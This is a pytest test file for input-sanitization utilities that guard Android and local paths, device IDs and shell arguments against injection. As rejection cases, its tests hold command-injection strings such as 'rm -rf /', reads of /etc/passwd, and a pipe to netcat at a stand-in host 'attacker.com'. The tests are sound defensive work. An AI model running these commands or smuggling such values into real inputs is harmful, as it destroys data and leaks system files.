"""
Tests for security utilities - input sanitization and validation.
"""

import os
import pytest
from src.utils.security_utils import (
    sanitize_path_component,
    sanitize_android_path,
    sanitize_local_path,
    validate_device_id,
    escape_shell_arg,
)


class TestSanitizePathComponent:
    """Tests for sanitize_path_component function."""

    def test_valid_component(self):
        """Test that valid path components are accepted."""
        assert sanitize_path_component("file.txt") == "file.txt"
        assert sanitize_path_component("folder") == "folder"
        assert sanitize_path_component("my_file-2.txt") == "my_file-2.txt"

    def test_empty_component(self):
        """Test that empty components are rejected."""
        with pytest.raises(ValueError, match="Path component cannot be empty"):
            sanitize_path_component("")

    def test_dangerous_chars(self):
        """Test that dangerous characters are rejected."""
        dangerous_chars = [';', '|', '&', '$', '`', '\n', '\r', '>', '<', '(', ')']
        for char in dangerous_chars:
            with pytest.raises(ValueError, match="dangerous character"):
                sanitize_path_component(f"file{char}name.txt")

    def test_command_substitution(self):
        """Test that command substitution patterns are rejected."""
        with pytest.raises(ValueError, match="dangerous character"):
            sanitize_path_component("file$(whoami).txt")
        with pytest.raises(ValueError, match="dangerous character"):
            sanitize_path_component("file${USER}.txt")


class TestSanitizeAndroidPath:
    """Tests for sanitize_android_path function."""

    def test_valid_absolute_path(self):
        """Test that valid absolute paths are accepted."""
        assert sanitize_android_path("/sdcard/Download") == "/sdcard/Download"
        assert sanitize_android_path("/data/local/tmp") == "/data/local/tmp"

    def test_valid_relative_path(self):
        """Test that valid relative paths are accepted."""
        assert sanitize_android_path("./folder/file.txt") == "./folder/file.txt"

    def test_empty_path(self):
        """Test that empty paths are rejected."""
        with pytest.raises(ValueError, match="Path cannot be empty"):
            sanitize_android_path("")

    def test_null_byte(self):
        """Test that null bytes are rejected."""
        with pytest.raises(ValueError, match="null byte"):
            sanitize_android_path("/sdcard/file\x00.txt")

    def test_command_injection_semicolon(self):
        """Test that semicolon command injection is blocked."""
        with pytest.raises(ValueError, match="dangerous pattern"):
            sanitize_android_path("/sdcard/file; rm -rf /")

    def test_command_injection_pipe(self):
        """Test that pipe command injection is blocked."""
        with pytest.raises(ValueError, match="dangerous pattern"):
            sanitize_android_path("/sdcard/file | cat /etc/passwd")

    def test_command_injection_ampersand(self):
        """Test that ampersand command injection is blocked."""
        with pytest.raises(ValueError, match="dangerous pattern"):
            sanitize_android_path("/sdcard/file && malicious")

    def test_command_substitution(self):
        """Test that command substitution is blocked."""
        with pytest.raises(ValueError, match="dangerous pattern"):
            sanitize_android_path("/sdcard/$(whoami)")
        with pytest.raises(ValueError, match="dangerous pattern"):
            sanitize_android_path("/sdcard/${USER}")

    def test_backtick_substitution(self):
        """Test that backtick command substitution is blocked."""
        with pytest.raises(ValueError, match="dangerous pattern"):
            sanitize_android_path("/sdcard/`whoami`")


class TestSanitizeLocalPath:
    """Tests for sanitize_local_path function."""

    def test_valid_absolute_path(self):
        """Test that valid absolute paths are normalized."""
        result = sanitize_local_path("/tmp/test")
        assert os.path.isabs(result)

    def test_empty_path(self):
        """Test that empty paths are rejected."""
        with pytest.raises(ValueError, match="Path cannot be empty"):
            sanitize_local_path("")

    def test_null_byte(self):
        """Test that null bytes are rejected."""
        with pytest.raises(ValueError, match="null byte"):
            sanitize_local_path("/tmp/file\x00.txt")

    def test_path_traversal_with_base_dir(self):
        """Test that path traversal outside base_dir is blocked."""
        base = "/tmp/safe"
        with pytest.raises(ValueError, match="outside base directory"):
            sanitize_local_path("/tmp/unsafe", base_dir=base)

    def test_valid_path_within_base_dir(self):
        """Test that paths within base_dir are accepted."""
        base = "/tmp/safe"
        result = sanitize_local_path("/tmp/safe/subdir", base_dir=base)
        # result is an absolute path, so we need to compare absolute versions
        base_abs = os.path.abspath(base)
        assert result.startswith(base_abs)

    def test_path_normalization(self):
        """Test that paths with .. are normalized."""
        result = sanitize_local_path("/tmp/test/../other")
        assert ".." not in result


class TestValidateDeviceId:
    """Tests for validate_device_id function."""

    def test_valid_device_id(self):
        """Test that valid device IDs are accepted."""
        assert validate_device_id("ABC123") == "ABC123"
        assert validate_device_id("192.168.1.1:5555") == "192.168.1.1:5555"
        assert validate_device_id("emulator-5554") == "emulator-5554"

    def test_empty_device_id(self):
        """Test that empty device IDs are rejected."""
        with pytest.raises(ValueError, match="Device ID cannot be empty"):
            validate_device_id("")

    def test_invalid_characters(self):
        """Test that invalid characters are rejected."""
        dangerous_chars = [';', '|', '&', '$', '`', '\n', '\r', ' ', '>', '<']
        for char in dangerous_chars:
            with pytest.raises(ValueError):
                validate_device_id(f"device{char}123")


class TestEscapeShellArg:
    """Tests for escape_shell_arg function."""

    def test_safe_argument(self):
        """Test that safe arguments are passed through."""
        assert escape_shell_arg("safe-file_name.txt") == "safe-file_name.txt"

    def test_empty_argument(self):
        """Test that empty arguments are handled."""
        assert escape_shell_arg("") == ""

    def test_shell_metacharacters(self):
        """Test that shell metacharacters are rejected."""
        dangerous_chars = [';', '|', '&', '$', '`', '>', '<', '(', ')', '*']
        for char in dangerous_chars:
            with pytest.raises(ValueError, match="shell metacharacter"):
                escape_shell_arg(f"arg{char}value")


class TestSecurityIntegration:
    """Integration tests for security utilities."""

    def test_prevent_command_injection_in_path(self):
        """Test that common command injection attempts are blocked."""
        malicious_paths = [
            "/sdcard/file; rm -rf /",
            "/sdcard/file && cat /etc/passwd",
            "/sdcard/file | nc attacker.com 1234",
            "/sdcard/$(malicious_command)",
            "/sdcard/`whoami`",
            "/sdcard/file\nmalicious_command",
        ]
        for path in malicious_paths:
            with pytest.raises(ValueError):
                sanitize_android_path(path)

    def test_prevent_path_traversal(self):
        """Test that path traversal attempts are detected."""
        base = "/tmp/restricted"
        with pytest.raises(ValueError):
            sanitize_local_path("/etc/passwd", base_dir=base)
